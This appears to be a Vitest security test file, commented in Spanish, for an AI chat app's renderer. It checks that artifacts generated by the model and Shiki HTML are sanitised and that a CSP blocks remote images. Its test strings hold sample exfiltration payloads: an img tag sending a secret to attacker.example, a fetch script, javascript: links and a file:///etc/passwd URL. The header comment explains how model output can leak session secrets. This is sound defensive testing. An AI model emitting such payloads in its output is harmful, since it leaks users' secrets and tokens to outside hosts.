// T3 (Ola 1b) / EGO-FIND-61 — Sanitización del HTML del chat + CSP `img-src`.
//
// RED primero.
//
// HALLAZGO (medido, no inferido): el chat NO usa `react-markdown`. El
// renderizador de Markdown (`components/assistant-ui/markdown-text.tsx`) es un
// parser propio que emite **nodos de texto de React** (auto-escapados) y
// bloques `<pre>`: no hay inyección de HTML en esa ruta.
//
// Los dos puntos donde SÍ entra HTML al DOM del renderer son:
//  1. `components/assistant-ui/shiki-highlight.tsx` → `dangerouslySetInnerHTML`
//     con el HTML que produce nuestro worker de Shiki.
//  2. `components/assistant-ui/artifact-card.tsx` → `<iframe srcDoc={...}>`
//     con el artifact HTML/SVG generado por el modelo.
//
// El (2) es el vector de exfiltración real: un artifact con
// `<img src="https://attacker.example/?x=<secreto>">` hace que el renderer
// pida esa URL (con las cookies/token de la sesión en el `Referer`).
// La CSP `img-src 'self' data: blob:` ya lo bloquea en el navegador; el
// sanitizado lo cierra en la raíz (la URL ni siquiera llega al DOM).
import { describe, it, expect } from "vitest";
import { readFileSync, existsSync } from "node:fs";
import { join } from "node:path";
import {
  sanitizeArtifactHtml,
  sanitizeShikiHtml,
  isRemoteResource,
} from "../lib/sanitize-html.js";

const RENDERER = join(process.cwd());
const readSrc = (name: string): string => {
  const p = join(RENDERER, name);
  return existsSync(p) ? readFileSync(p, "utf8") : "";
};

describe("T3: sanitización del HTML del chat (DOMPurify)", () => {
  it("el artifact NO conserva imágenes remotas (vector de exfiltración)", () => {
    const dirty = `<div><img src="https://attacker.example/?x=SECRETO" onerror="alert(1)"><p>hola</p></div>`;
    const clean = sanitizeArtifactHtml(dirty);
    expect(clean).not.toContain("attacker.example");
    expect(clean).not.toContain("onerror");
    expect(clean).toContain("hola");
  });

  it("el artifact NO conserva scripts, iframes ni handlers inline", () => {
    const dirty = `<script>fetch('https://attacker.example')</script><iframe src="https://evil"></iframe><a href="javascript:alert(1)">x</a><div onclick="steal()">y</div>`;
    const clean = sanitizeArtifactHtml(dirty);
    expect(clean).not.toContain("<script");
    expect(clean).not.toContain("<iframe");
    expect(clean).not.toContain("javascript:");
    expect(clean).not.toContain("onclick");
  });

  it("el artifact NUNCA conserva recursos remotos (propiedad de seguridad)", () => {
    const dirty = `<img src="https://attacker.example/?x=SECRETO"><img src="//attacker.example/y"><a href="https://attacker.example">z</a>`;
    const clean = sanitizeArtifactHtml(dirty);
    expect(clean).not.toMatch(/https?:/);
    expect(clean).not.toMatch(/src="\/\//);
    expect(clean).not.toMatch(/href="https?:/);
  });

  it("el HTML de Shiki se sanea conservando el marcado del tema", () => {
    const dirty = `<pre class="shiki" style="background:#0d1117"><code><span class="line">const a = 1;</span></code></pre><script>alert(1)</script>`;
    const clean = sanitizeShikiHtml(dirty);
    expect(clean).toContain("shiki");
    expect(clean).toContain("const a = 1;");
    expect(clean).not.toContain("<script");
  });

  it("el regex de recursos remotos detecta URLs absolutas y protocol-relative", () => {
    expect(isRemoteResource("https://attacker.example/x")).toBe(true);
    expect(isRemoteResource("http://attacker.example/x")).toBe(true);
    expect(isRemoteResource("//attacker.example/x")).toBe(true);
    expect(isRemoteResource("javascript:alert(1)")).toBe(true);
    expect(isRemoteResource("file:///etc/passwd")).toBe(true);
    expect(isRemoteResource("local.png")).toBe(false);
    expect(isRemoteResource("/assets/x.png")).toBe(false);
    expect(isRemoteResource("./x.png")).toBe(false);
    expect(isRemoteResource("data:image/png;base64,iVBORw0KGgo=")).toBe(false);
    // Un SVG embebido puede llevar script: NO es local.
    expect(isRemoteResource("data:image/svg+xml;base64,PHN2Zz4=")).toBe(true);
  });

  it("el render de Markdown del chat NO usa dangerouslySetInnerHTML", () => {
    const md = readSrc("components/assistant-ui/markdown-text.tsx");
    expect(md).not.toContain("dangerouslySetInnerHTML");
  });

  it("el HTML de Shiki pasa por el sanitizador (no se inyecta crudo)", () => {
    const shiki = readSrc("components/assistant-ui/shiki-highlight.tsx");
    expect(shiki).toContain("sanitizeShikiHtml");
  });

  it("el artifact se sanea antes de meterse en el srcDoc", () => {
    const card = readSrc("components/assistant-ui/artifact-card.tsx");
    expect(card).toContain("sanitizeArtifactHtml");
  });

  it("la CSP restringe img-src a origen+datos locales (bloquea la exfiltración)", () => {
    const html = readSrc("index.html");
    expect(html).toMatch(/Content-Security-Policy/);
    expect(html).toMatch(/img-src 'self' data: blob:/);
    // Sin comodín en img-src: `img-src *` o `img-src https:` permitirían
    // la exfiltración por imagen Markdown.
    const csp = html.match(/http-equiv="Content-Security-Policy"[^>]*content="([^"]*)"/)?.[1] ?? "";
    const imgSrc = csp.split(";").map((s) => s.trim()).find((s) => s.startsWith("img-src"));
    expect(imgSrc).toBeTruthy();
    expect(imgSrc).not.toContain("*");
    expect(imgSrc).not.toContain("https:");
    expect(imgSrc).not.toContain("http:");
  });
});
